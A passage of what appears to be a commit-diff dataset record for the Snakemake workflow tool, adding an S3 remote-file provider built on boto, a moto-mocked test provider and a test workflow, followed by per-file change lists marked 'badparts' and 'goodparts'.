os.rmdir(pathToDel)\n+                pathToDel = os.path.dirname(pathToDel)\n+\n+\n     def format_wildcards(self, string, **variables):\n         \"\"\" Format a string with variables from the job. \"\"\"\n         _variables = dict()\ndiff --git a\/snakemake\/remote_providers\/RemoteObjectProvider.py b\/snakemake\/remote_providers\/RemoteObjectProvider.py\nnew file mode 100644\nindex 0000000..b040e87\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/RemoteObjectProvider.py\n@@ -0,0 +1,50 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+from abc import ABCMeta, abstractmethod\n+\n+\n+class RemoteObject:\n+    \"\"\" This is an abstract class to be used to derive remote object classes for \n+        different cloud storage providers. For example, there could be classes for interacting with \n+        Amazon AWS S3 and Google Cloud Storage, both derived from this common base class.\n+    \"\"\"\n+    __metaclass__ = ABCMeta\n+\n+    def __init__(self, ioFile):\n+        self._iofile = ioFile\n+        self._file = ioFile._file\n+\n+    @abstractmethod\n+    def file(self):\n+        pass\n+\n+    @abstractmethod\n+    def exists(self):\n+        pass\n+\n+    @abstractmethod\n+    def mtime(self):\n+        pass\n+\n+    @abstractmethod\n+    def size(self):\n+        pass\n+\n+    @abstractmethod\n+    def download(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def upload(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def list(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def name(self, *args, **kwargs):\n+        pass\ndiff --git a\/snakemake\/remote_providers\/S3.py b\/snakemake\/remote_providers\/S3.py\nnew file mode 100644\nindex 0000000..77b15ea\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/S3.py\n@@ -0,0 +1,90 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import re\n+\n+from snakemake.remote_providers.RemoteObjectProvider import RemoteObject\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import memoize\n+\n+import boto\n+\n+\n+class RemoteObject(RemoteObject):\n+    \"\"\" This is a class to interact with the AWS S3 object store.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+        # pass all args but the first, which is the ioFile\n+        self._s3c = S3Helper(*args[1:], **kwargs)\n+\n+    # === Implementations of abstract class members ===\n+\n+    def file(self):\n+        return self._file\n+\n+    def exists(self):\n+        if self._matched_s3_path:\n+            return self._s3c.exists_in_bucket(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file cannot be parsed as an s3 path in form 'bucket\/key': %s\" % self.file())\n+\n+    def mtime(self):\n+        if self.exists():\n+            return self._s3c.key_last_modified(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file does not seem to exist remotely: %s\" % self.file())\n+\n+    def size(self):\n+        if self.exists():\n+            return self._s3c.key_size(self.s3_bucket, self.s3_key)\n+        else:\n+            return self._iofile.size_local\n+\n+    def download(self):\n+        self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file())\n+\n+    def upload(self):\n+        conn = boto.connect_s3()\n+        if self.size() > 5000:\n+            self._s3c.upload_to_s3_multipart(self.s3_bucket, self.file(), self.s3_key)\n+        else:\n+            self._s3c.upload_to_s3(self.s3_bucket, self.file(), self.s3_key)\n+\n+    @property\n+    def list(self):\n+        return self._s3c.list_keys(self.s3_bucket)\n+\n+    # === Related methods ===\n+\n+    @property\n+    def _matched_s3_path(self):\n+        return re.search(\"(?P<bucket>[^\/]*)\/(?P<key>.*)\", self.file())\n+\n+    @property\n+    def s3_bucket(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"bucket\")\n+        return None\n+\n+    @property\n+    def name(self):\n+        return self.s3_key\n+\n+    @property\n+    def s3_key(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"key\")\n+\n+    def s3_create_stub(self):\n+        if self._matched_s3_path:\n+            if not self.exists:\n+                self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file, createStubOnly=True)\n+        else:\n+            raise S3FileException(\"The file to be downloaded cannot be parsed as an s3 path in form 'bucket\/key': %s\" %\n+                                  self.file())\ndiff --git a\/snakemake\/remote_providers\/__init__.py b\/snakemake\/remote_providers\/__init__.py\nnew file mode 100644\nindex 0000000..8b13789\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/__init__.py\n@@ -0,0 +1 @@\n+\ndiff --git a\/snakemake\/remote_providers\/implementations\/S3.py b\/snakemake\/remote_providers\/implementations\/S3.py\nnew file mode 100644\nindex 0000000..c6cb622\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/implementations\/S3.py\n@@ -0,0 +1,341 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os\n+import math\n+import time\n+import email.utils\n+from time import mktime\n+import datetime\n+from multiprocessing import Pool\n+\n+# third-party modules\n+import boto\n+from boto.s3.key import Key\n+from filechunkio import FileChunkIO\n+\n+\n+class S3Helper(object):\n+\n+    def __init__(self, *args, **kwargs):\n+        # as per boto, expects the environment variables to be set:\n+        # AWS_ACCESS_KEY_ID\n+        # AWS_SECRET_ACCESS_KEY\n+        # Otherwise these values need to be passed in as kwargs\n+        self.conn = boto.connect_s3(*args, **kwargs)\n+\n+    def upload_to_s3(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        k = Key(b)\n+\n+        if key:\n+            k.key = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+            k.key = pathKey\n+        try:\n+            bytesWritten = k.set_contents_from_filename(\n+                filePath,\n+                replace=replace,\n+                reduced_redundancy=reduced_redundancy,\n+                headers=headers)\n+            if bytesWritten:\n+                return k.key\n+            else:\n+                return None\n+        except:\n+            return None\n+\n+    def download_from_s3(\n+            self,\n+            bucketName,\n+            key,\n+            destinationPath=None,\n+            expandKeyIntoDirs=True,\n+            makeDestDirs=True,\n+            headers=None, createStubOnly=False):\n+        \"\"\" Download a file from s3\n+\n+            This function downloads an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                destinationPath: If specified, the file will be saved to this path, otherwise cwd.\n+                expandKeyIntoDirs: Since S3 keys can include slashes, if this is True (defult)\n+                    then S3 keys with slashes are expanded into directories on the receiving end.\n+                    If it is False, the key is passed to os.path.basename() to get the substring\n+                    following the last slash.\n+                makeDestDirs: If this is True (default) and the destination path includes directories\n+                    that do not exist, they will be created.\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The destination path of the downloaded file on the receiving end, or None if the filePath\n+                could not be downloaded\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+\n+        if destinationPath:\n+            destinationPath = os.path.realpath(os.path.expanduser(destinationPath))\n+        else:\n+            if expandKeyIntoDirs:\n+                destinationPath = os.path.join(os.getcwd(), key)\n+            else:\n+                destinationPath = os.path.join(os.getcwd(), os.path.basename(key))\n+\n+        # if the destination path does not exist\n+        if not os.path.exists(os.path.dirname(destinationPath)) and makeDestDirs:\n+            os.makedirs(os.path.dirname(destinationPath))\n+\n+        k.key = key if key else os.path.basename(filePath)\n+\n+        try:\n+            if not createStubOnly:\n+                k.get_contents_to_filename(destinationPath, headers=headers)\n+            else:\n+                # just create an empty file with the right timestamps\n+                with open(destinationPath, 'wb') as fp:\n+                    modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+                    modified_stamp = int(email.utils.mktime_tz(modified_tuple))\n+                    os.utime(fp.name, (modified_stamp, modified_stamp))\n+            return destinationPath\n+        except:\n+            return None\n+\n+    def _upload_part(self, bucketName, multipart_id, part_num, source_path, offset, bytesToWrite, numberOfRetries=5):\n+\n+        def _upload(retriesRemaining=numberOfRetries):\n+            try:\n+                b = self.conn.get_bucket(bucketName)\n+                for mp in b.get_all_multipart_uploads():\n+                    if mp.id == multipart_id:\n+                        with FileChunkIO(source_path, 'r', offset=offset, bytes=bytesToWrite) as fp:\n+                            mp.upload_part_from_file(fp=fp, part_num=part_num)\n+                        break\n+            except Exception() as e:\n+                if retriesRemaining:\n+                    _upload(retriesRemaining=retriesRemaining - 1)\n+                else:\n+                    raise e\n+\n+        _upload()\n+\n+    def upload_to_s3_multipart(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None,\n+            parallel_processes=4):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+                parallel_processes: Number of concurrent uploads\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        pathKey = None\n+        if key:\n+            pathKey = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+\n+        mp = b.initiate_multipart_upload(pathKey, headers=headers)\n+\n+        sourceSize = os.stat(filePath).st_size\n+\n+        bytesPerChunk = 52428800  # 50MB = 50 * 1024 * 1024\n+        chunkCount = int(math.ceil(sourceSize \/ float(bytesPerChunk)))\n+\n+        pool = Pool(processes=parallel_processes)\n+        for i in range(chunkCount):\n+            offset = i * bytesPerChunk\n+            remainingBytes = sourceSize - offset\n+            bytesToWrite = min([bytesPerChunk, remainingBytes])\n+            partNum = i + 1\n+            pool.apply_async(self._upload_part, [bucketName, mp.id, partNum, filePath, offset, bytesToWrite])\n+        pool.close()\n+        pool.join()\n+\n+        if len(mp.get_all_parts()) == chunkCount:\n+            mp.complete_upload()\n+            try:\n+                key = b.get_key(pathKey)\n+                return key.key\n+            except:\n+                return None\n+        else:\n+            mp.cancel_upload()\n+            return None\n+\n+    def delete_from_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Delete a file from s3\n+\n+            This function deletes an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The name of the object deleted\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        ret = k.delete(headers=headers)\n+        return ret.name\n+\n+    def exists_in_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Returns whether the key exists in the bucket\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                True | False\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        return k.exists(headers=headers)\n+\n+    def key_size(self, bucketName, key, headers=None):\n+        \"\"\" Returns the size of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                Size in kb\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        return k.size\n+\n+    def key_last_modified(self, bucketName, key, headers=None):\n+        \"\"\" Returns a timestamp of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                timestamp\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        # email.utils parsing of timestamp mirrors boto whereas\n+        # time.strptime() can have TZ issues due to DST\n+        modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+        epochTime = int(email.utils.mktime_tz(modified_tuple))\n+\n+        return epochTime\n+\n+    def list_keys(self, bucketName):\n+        return self.conn.get_bucket(bucketName).list()\ndiff --git a\/snakemake\/rules.py b\/snakemake\/rules.py\nindex 3608167..5324eeb 100644\n--- a\/snakemake\/rules.py\n+++ b\/snakemake\/rules.py\n@@ -95,7 +95,12 @@ def get_io(rule):\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     return None\n \ndiff --git a\/snakemake\/workflow.py b\/snakemake\/workflow.py\nindex b035bc3..833bd90 100644\n--- a\/snakemake\/workflow.py\n+++ b\/snakemake\/workflow.py\n@@ -23,7 +23,7 @@\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import update_config\n \ndiff --git a\/tests\/test_remote\/S3Mocked.py b\/tests\/test_remote\/S3Mocked.py\nnew file mode 100644\nindex 0000000..d8cc489\n--- \/dev\/null\n+++ b\/tests\/test_remote\/S3Mocked.py\n@@ -0,0 +1,103 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os, sys\n+from contextlib import contextmanager\n+import pickle\n+import time\n+import threading\n+\n+# third-party\n+import boto\n+from moto import mock_s3\n+\n+# intra-module\n+from snakemake.remote_providers.S3 import RemoteObject as S3RemoteObject\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import decAllMethods\n+\n+def noop():\n+    pass\n+\n+def pickledMotoWrapper(func):\n+    \"\"\"\n+        This is a class decorator that in turn decorates all methods within\n+        a class to mock out boto calls with moto-simulated ones.\n+        Since the moto backends are not presistent across calls by default, \n+        the wrapper also pickles the bucket state after each function call,\n+        and restores it before execution. This way uploaded files are available\n+        for follow-on tasks. Since snakemake may execute with multiple threads\n+        it also waits for the pickled bucket state file to be available before\n+        loading it in. This is a hackey alternative to using proper locks,\n+        but works ok in practice.\n+    \"\"\"\n+    def wrapper_func(self, *args, **kwargs):\n+        motoContextFile = \"motoState.p\"\n+\n+        motoContext = mock_s3()\n+\n+        # load moto buckets from pickle\n+        if os.path.isfile(motoContextFile) and os.path.getsize(motoContextFile) > 0:\n+            with file_lock(motoContextFile):\n+                with open( motoContextFile, \"rb\" ) as f:\n+                    motoContext.backends[\"global\"].buckets = pickle.load( f )\n+\n+        motoContext.backends[\"global\"].reset = noop\n+\n+        mockedFunction = motoContext(func)\n+\n+        retval = mockedFunction(self, *args, **kwargs)\n+\n+        with file_lock(motoContextFile):\n+            with open( motoContextFile, \"wb\" ) as f:\n+                pickle.dump(motoContext.backends[\"global\"].buckets, f)\n+\n+        return retval\n+    return wrapper_func\n+\n+@decAllMethods(pickledMotoWrapper, prefix=None)\n+class RemoteObject(S3RemoteObject):\n+    \"\"\" \n+        This is a derivative of the S3 remote provider that mocks\n+        out boto-based S3 calls using the \"moto\" Python package.\n+        Only the initializer is different; it \"uploads\" the input \n+        test file to the moto-simulated bucket at the start.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        bucketName = 'test-remote-bucket'\n+        testFile = \"test.txt\"\n+\n+        conn = boto.connect_s3()\n+        if bucketName not in [b.name for b in conn.get_all_buckets()]:\n+            conn.create_bucket(bucketName)\n+\n+        # \"Upload\" files that should be in S3 before tests...\n+        s3c = S3Helper()\n+        if not s3c.exists_in_bucket(bucketName, testFile):\n+            s3c.upload_to_s3(bucketName, testFile)\n+\n+        return super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+\n+# ====== Helpers =====\n+\n+@contextmanager\n+def file_lock(filepath):\n+    lock_file = filepath + \".lock\"\n+\n+    while os.path.isfile(lock_file):\n+        time.sleep(0.1)\n+\n+    with open(lock_file, 'w') as f:\n+        f.write(\"1\")\n+\n+    try:\n+        yield\n+    finally:\n+        if os.path.isfile(lock_file):\n+            os.remove(lock_file)\n+\ndiff --git a\/tests\/test_remote\/Snakefile b\/tests\/test_remote\/Snakefile\nnew file mode 100644\nindex 0000000..b2e1298\n--- \/dev\/null\n+++ b\/tests\/test_remote\/Snakefile\n@@ -0,0 +1,49 @@\n+import re, os, sys\n+\n+import S3Mocked as S3Mocked\n+\n+#remote dynamic file test\n+\n+# This makes use of a special provider that mocks up S3 using the moto\n+# library so that boto calls hit local \"buckets\"\n+\n+rule all:\n+    input:\n+        # only keeping the file so we can copy it out to the cwd\n+        remote(\"test-remote-bucket\/out.txt\", keep=True, provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell(\"mv test-remote-bucket\/out.txt .\/\")\n+\n+rule split:\n+    input: remote('test-remote-bucket\/test.txt', keep=False, provider=S3Mocked, additional_kwargs={})\n+    output: remote(dynamic('test-remote-bucket\/prefix{split_id}.txt'), provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell('split -l 2 {input} test-remote-bucket\/prefix')\n+        for f in os.listdir(os.getcwd()+\"\/test-remote-bucket\"):\n+            if re.search('prefix[a-z][a-z]', f):\n+                os.rename(\"test-remote-bucket\/\"+f, \"test-remote-bucket\/\"+f + '.txt')\n+\n+rule cut:\n+    input: remote('test-remote-bucket\/prefix{split_id,[a-z][a-z]}.txt', provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket\/{split_id}_cut.txt', provider=S3Mocked, additional_kwargs={})\n+    shell: 'cut -f 1,2 {input} > {output}'\n+\n+rule merge:\n+    input: \n+        remote(dynamic('test-remote-bucket\/{split_id}_cut.txt'), provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket\/out.txt', provider=S3Mocked, additional_kwargs={}),\n+    run: \n+        shell('echo {input}; cat {input} > {output}')\n+\n+\n+# after we finish, we need to remove the pickle storing\n+# the local moto \"buckets\" so we are starting fresh\n+# next time this test is run. This file is created by\n+# the moto wrapper defined in S3Mocked.py\n+onsuccess:\n+    shell(\"rm .\/motoState.p\")\n+\n+onerror:\n+    shell(\"rm .\/motoState.p\")\n\\ No newline at end of file\ndiff --git a\/tests\/test_benchmark\/expected-results\/test.benchmark.json b\/tests\/test_remote\/__init__.py\nsimilarity index 100%\nrename from tests\/test_benchmark\/expected-results\/test.benchmark.json\nrename to tests\/test_remote\/__init__.py\ndiff --git a\/tests\/test_remote\/expected-results\/out.txt b\/tests\/test_remote\/expected-results\/out.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- \/dev\/null\n+++ b\/tests\/test_remote\/expected-results\/out.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a\/tests\/test_remote\/test.txt b\/tests\/test_remote\/test.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- \/dev\/null\n+++ b\/tests\/test_remote\/test.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a\/tests\/tests.py b\/tests\/tests.py\nold mode 100644\nnew mode 100755\nindex 37dd180..6b53573\n--- a\/tests\/tests.py\n+++ b\/tests\/tests.py\n@@ -265,6 +265,9 @@ def test_multiple_includes():\n def test_yaml_config():\n     run(dpath(\"test_yaml_config\"))\n \n+def test_remote():\n+   run(dpath(\"test_remote\"))\n+\n \n def test_cluster_sync():\n     run(dpath(\"test14\"),\n","files":{"\/snakemake\/dag.py":{"changes":[{"diff":"\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n","add":1,"remove":1,"filename":"\/snakemake\/dag.py","badparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"],"goodparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]},{"diff":"\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n","add":1,"remove":1,"filename":"\/snakemake\/dag.py","badparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"],"goodparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]}]},"\/snakemake\/io.py":{"changes":[{"diff":"\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"],"goodparts":["import functools","from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException","import snakemake.remote_providers.S3 as S3"]},{"diff":"\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n","add":45,"remove":3,"filename":"\/snakemake\/io.py","badparts":["    def protected(self):","        return self.exists and not os.access(self.file, os.W_OK)","        if not self.exists and lstat(self.file):"],"goodparts":["    @_referToRemote","    def exists_local(self):","        return os.path.exists(self.file)","    @property","    def exists_remote(self):","        return (self.is_remote and self.remote_object.exists())","    def protected(self):","        return self.exists_local and not os.access(self.file, os.W_OK)","    @property","    @_referToRemote","        return lstat(self.file).st_mtime","    @property","    def flags(self):","        return getattr(self._file, \"flags\", {})","    @property","    def mtime_local(self):","    @_referToRemote","    @property","    def size_local(self):","        self.check_broken_symlink()","        return os.path.getsize(self.file)","        if not self.exists_local and lstat(self.file):","    def download_from_remote(self):","        logger.info(\"Downloading from remote: {}\".format(self.file))","        if self.is_remote and self.remote_object.exists():","            self.remote_object.download()","        else:","            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")","    def upload_to_remote(self):","        logger.info(\"Uploading to remote: {}\".format(self.file))","        if self.is_remote and not self.remote_object.exists():","            self.remote_object.upload()","        else:","            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]},{"diff":"\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["    def touch(self):","            lutime(self.file, None)"],"goodparts":["    def touch(self, times=None):","        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"","            lutime(self.file, times)"]},{"diff":"\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n","add":12,"remove":2,"filename":"\/snakemake\/io.py","badparts":["        return IOFile(apply_wildcards(f, wildcards,","                      rule=self.rule)"],"goodparts":["        flagsBeforeWildcardResolution = 